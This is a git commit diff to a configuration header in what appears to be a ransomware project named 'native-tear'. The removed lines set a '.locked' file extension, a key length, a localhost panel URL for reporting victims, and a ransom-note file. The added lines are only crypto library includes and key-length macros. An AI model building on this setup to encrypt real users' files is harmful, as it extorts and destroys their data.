1b1571979f11e448e13f9bd60e902a5f230a5a7f
Xrosheart <31621210+YZ-WANG@users.noreply.github.com>
2019-03-31 00:23:21 +0800

    Update config.h

--- src/encrpter/config.h
+++ src/encrpter/config.h
@@ -1,29 +1,23 @@
-/*
- * Extension for all locked files
- */
+#include <boost/filesystem/operations.hpp>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <cryptopp/aes.h>
+#include <cryptopp/rsa.h>
+#include <cryptopp/default.h>
+#include <cryptopp/osrng.h>
+#include <cryptopp/cryptlib.h>
+#include <cryptopp/hex.h>
+#include <cryptopp/filters.h>
+#include <cryptopp/files.h>
+#include <cryptopp/ccm.h>
+
+using namespace boost::filesystem;
+using namespace CryptoPP;
+using namespace std;
+
 #define LOCKED_EXTENSION ".locked"
+// #define KEY_LEN 32 // 256 bits
+#define KEY_LEN AES::DEFAULT_KEYLENGTH
+#define IV_LEN CryptoPP::AES::BLOCKSIZE
 
-/*
- * Key length in bytes, default is 32 (256 bits)
- */
-#define KEY_LEN 32 // 256 bits
-
-/*
- * URL to add.php
- */
-#define URL_PANEL "http://localhost/add.php"
-
-/*
- * Message to display
- */
-const char *NOTIFY_MESSAGE = "<p>native-tear</p>";
-
-/*
- * If notification file should be created
- */
-#define OPEN_FILE true
-
-/*
- * Notification file name
- */
-#define NOTIFY_FILENAME "note.html"
